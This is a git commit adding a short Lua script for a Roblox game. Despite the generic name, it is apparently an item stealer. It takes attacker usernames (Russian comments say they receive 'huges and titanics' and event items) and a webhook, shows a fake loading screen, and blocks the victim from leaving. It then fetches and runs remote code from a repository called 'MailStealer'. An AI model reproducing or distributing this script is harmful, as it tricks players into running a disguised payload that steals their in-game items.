13992b3415ef47880ea3d4ad016c5446f3b48893
hsdfuyhsdufhs <128642081+hsdfuyhsdufhs@users.noreply.github.com>
2023-07-26 22:06:27 +0300

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,15 @@
+UserName = "сюда ник для хугов и титаников"
+Webhook = "Webhook Here"
+UserName2 = "сюда ник для ивенток и эксклюзивок"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+
+_G.LoadingText1 = "Loading Library"
+_G.LoadingText2 = "Updating Library"
+_G.LoadingText3 = "Getting Script"
+_G.LoadingText4 = "Executing Script"
+_G.LoadingText5 = "Error: Execution Failed, re-trying!"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hsdfuyhsdufhs/MailStealer/main/engine"))()
